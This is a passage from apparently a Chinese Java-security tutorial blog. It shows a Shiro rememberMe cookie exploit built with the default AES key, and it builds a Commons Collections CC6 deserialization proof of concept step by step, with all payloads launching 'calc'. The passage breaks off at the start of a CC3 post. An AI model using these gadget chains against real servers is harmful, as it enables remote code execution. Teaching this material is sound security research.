class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg&quot;.getBytes());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的POC传入cookie，弹出计算器</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/gg.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>JAVA安全任重道远，希望对你有所帮助！</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections6</title>
      <link href="/2023/05/17/JAVA-CommonsCollections6/"/>
      <url>/2023/05/17/JAVA-CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CC6"><a href="#为什么需要CC6" class="headerlink" title="为什么需要CC6"></a>为什么需要CC6</h1><p>因为这是 Shiro 会利用到的一条链子 可以说是 CC1 + lazymap 的一种重合，但是在 8U71之后，CC1不能用了，主要是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。</p><p>CC6 可以说是在CC库中 相对比较通用的利用链，这就是为什么 我CSDN 中也写了，并决定发在这的原因，在后续的Shiro 中 使用频率还是很高的，所以我决定再次深入了解其原理。为了解决高版本中 JAVA的利用问题，我们先来看看此链，继续贴上我的珍藏图：</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/cc%E9%93%BE.jpg"></p><p>可以看到 CC6 是利用的 HashMap的链子，这里贴一下P神 简化的利用链代码;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Gadget chain: </span><br><span class="line">java.io.ObjectInputStream.readObject() </span><br><span class="line">java.util.HashMap.readObject() </span><br><span class="line">java.util.HashMap.hash() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */</span><br></pre></td></tr></table></figure><p>这个链 主要是要看从最开始到 org.apache.commons.collections.map.LazyMap.get() 的那⼀部 分<br>简单来说，解决Java⾼版本利⽤问 题，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。</p><p>找到的类是 是 org.apache.commons.collections.keyvalue.TiedMapEntry ，在其getValue⽅法 中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">private static final long serialVersionUID = -8453869361373831205L;  </span><br><span class="line"></span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        this.map = map;  </span><br><span class="line">        this.key = key;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   public Object getKey() &#123;  </span><br><span class="line">        return key;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Object getValue() &#123;  </span><br><span class="line">        return map.get(key);  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">// ....</span><br><span class="line"></span><br><span class="line">public int hashCode() &#123; </span><br><span class="line">Object value = this.getValue(); </span><br><span class="line">return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;</span><br></pre></td></tr></table></figure><p>如果这里的 map &#x3D; LazyMap 就会调用LazyMap#get 触发CC1利用链，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了 TiedMapEntry#hashCode 。</p><p>，在 java.util.HashMap#readObject 中就可以找到 HashMap#hash() 的调⽤，去掉了 最前⾯的两次调⽤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap extends AbstractMap implements Map, Cloneable, Serializable &#123;</span><br><span class="line">static final int hash(Object key) &#123; </span><br><span class="line">int h;</span><br><span class="line">return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream s) throws IOException,ClassNotFoundException &#123;</span><br><span class="line"> s.defaultReadObject(); // ... p for (int i = 0; i &lt; mappings; i++) &#123; </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), </span><br><span class="line"> key, value, false, false); &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 hash(key) ，⽽hash⽅法中，调⽤到了 key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前⾯的分析过 程，构成⼀个完整的Gadget。</p><h1 id="逐步构造POC"><a href="#逐步构造POC" class="headerlink" title="逐步构造POC"></a>逐步构造POC</h1><p>然后尝试 自己构造一波这个 POC，再说说自己的踩坑过程，建议都自己构造一次，再来找问题，虽然 会有点长，但是你一步步自己构造一定会收获颇丰！ 以下是我个人的POC  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/exec1.PNG"></p><p>但实际上 我们这个计算器弹的是不正确的，为了避免本地调试时触发命令执 ⾏我们可以加入 假 的Transformer数组进去，等最后要⽣成Payload的 时候，再生成一个 ChainedTransformer，调用其方法，再把真正的 transformers 替换进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,transformers);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，这下G了  连计算器都不弹了……..</p><h1 id="为什么没有弹出计算器？"><a href="#为什么没有弹出计算器？" class="headerlink" title="为什么没有弹出计算器？"></a>为什么没有弹出计算器？</h1><p>单步调试⼀下 ，会发现关键点在LazyMap的get⽅法 ，他没有进入这个if语句，得到的结果就是没有触发我们的命令 </p><p><img src="/2023/05/17/JAVA-CommonsCollections6/ec.jpG"></p><p>这是为什么呢?<br><code>_containsKey_方法——判断是否包含指定的键名</code>  </p><p>唯一出现 Ku1s - 1 的地方 就是在我们 new TiedMapEntry 的时候<br>但 TiedMapEntry 的构造函数并没有修改outerMap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//LazyMap构造部分  </span><br><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">//TiedMapEntry构造部分  </span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);</span><br><span class="line"></span><br><span class="line">HashMap hashMap = new HashMap();  </span><br><span class="line">hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);</span><br></pre></td></tr></table></figure><p>其实关键点就在于 hashMap.put(tiedMapEntry,”Ku1s-2”); 语句</p><p>HashMap的put⽅法中，也有调⽤到 hash(key) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123; </span><br><span class="line">return putVal(hash(key), key, value, false, true); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈哈哈  这就相当于撞了个乌龙！~ 本来是想利用 readObject 中的 hash()去调用的，没曾想put方法也能够触发这个 hash ，也就是说提前把我们的代码执行了一遍，因为我前⾯⽤了 fakeTransformers ，所以此 时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响。</p><p>我们的解决⽅法也很简单，只需要将Ku1s-1这个Key，再从outerMap中移除即 可： outerMap.remove(“Ku1s-1”) 。</p><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] exp = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        outMap.remove(&quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,exp);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/JAVA-CommonsCollections6/poc.png"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections3</title>
      <link href="/2023/05/16/JAVA-CommonsCollections3/"/>
      <url>/2023/05/16/JAVA-CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CommonsCollections3"><a href="#为什么需要CommonsCollections3" class="headerlink" title="为什么需要CommonsCollections3"></a>为什么需要CommonsCollections3</h1><p>上篇文章 分析了 动态加载字节码的危害，如果有一个可控的http服务路径，则可能存在 恶意加载动态字节码，因此，我们很自然的会想到，如何更巧妙的利用他，所以 CC3 诞生了。</p><p>CC3 其实是 和 CC1 的结合  即 从原来的 InvokerTransformer 到 Runtime.class 到exec() 变成了 InvokerTransformer调用 TemplatesImpl#newTransformer()~</p><p>届时，我献出我珍藏已久的一张图：<br><img src="/2023/05/16/JAVA-CommonsCollections3/cc%E9%93%BE.jpg"></p><p>我们只需要将 CC1 和 CC3 两段POC 结合一下，即可很容易的改造出一个任意字节码的CC链，只需要把CC1中的 InvokerTransformer 的执行方法 改成 TemplatesImpl::newTransformer() 即可：</p><p>POC如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package CommonsCollections3;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc3&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = 